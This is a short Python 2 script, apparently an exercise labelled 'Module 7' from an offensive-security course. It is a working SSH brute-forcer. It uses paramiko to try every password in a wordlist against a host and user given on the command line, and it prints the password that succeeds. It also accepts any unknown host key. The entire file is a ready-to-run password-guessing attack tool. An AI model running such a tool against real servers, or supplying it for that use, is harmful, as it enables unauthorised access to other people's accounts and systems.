#!/usr/bin/python

print "                 __                      "
print "                |__|____ ___  __         "
print "                |  \__  \\\\  \/ /       "
print "                |  |/ __ \\\\   /        "
print "            /\__|  (____  /\_/           "
print "            \______|    \/               "
print "                                         "

print	'Module 7'
print

"""
make an ssh brute forcer with paramiko - kinda slow, could multithread
"""

import paramiko
import sys

host = sys.argv[1]
user = sys.argv[2]
passwordList = open('dict', 'r').readlines()

# client object
ssh = paramiko.SSHClient()

# what to do when there is no key is present
# does not accept leys by default
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in passwordList :
	try :
		ssh.connect(host, username=user, password=password.strip())
	except paramiko.AuthenticationException :
		pass
	except :
		print '[-] Error'
	else :
		print '[+] Found correct password : %s' %password

ssh.close()
